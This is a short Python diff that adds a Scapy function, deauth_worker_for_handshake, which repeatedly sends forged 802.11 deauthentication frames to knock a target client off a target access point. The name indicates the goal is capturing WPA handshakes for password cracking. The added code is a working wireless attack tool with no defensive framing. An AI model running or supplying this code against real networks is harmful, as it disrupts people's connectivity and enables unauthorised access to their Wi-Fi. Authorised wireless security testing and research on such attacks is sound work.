@@ -94,3 +94,27 @@ def deauth_worker(target_bssid, target_client, network_interface, count, interva
                 stop_signal.wait(interval * 2)
 
     print("[Deauth Thread] Stopped.")
+    
+    
+def deauth_worker_for_handshake(target_bssid, target_client, network_interface, count, interval, stop_signal):
+    """Sends deauthentication packets in a loop until stop_signal is set."""
+    print(f"[Deauth Thread] Starting deauthentication against BSSID: {target_bssid} on {network_interface}")
+    dot11 = Dot11(type=0, subtype=12, addr1=target_client, addr2=target_bssid, addr3=target_bssid)
+    deauth_frame_to_client = RadioTap() / dot11 / Dot11Deauth(reason=7)
+
+    while not stop_signal.is_set():
+        try:
+            # print(f"[Deauth Thread] Sending {count} deauth packets...") # Can be noisy
+            sendp(deauth_frame_to_client, iface=network_interface, count=count, inter=0.005, verbose=False)
+            stop_signal.wait(interval)
+        except OSError as e:
+            print(f"[Deauth Thread] Error sending packets: {e}. Stopping deauth.")
+            print("[Deauth Thread] Ensure the interface is in monitor mode and up.")
+            stop_signal.set()
+            break
+        except Exception as e:
+            print(f"[Deauth Thread] An unexpected error occurred: {e}")
+            time.sleep(1)
+
+    print("[Deauth Thread] Stopped.")
+
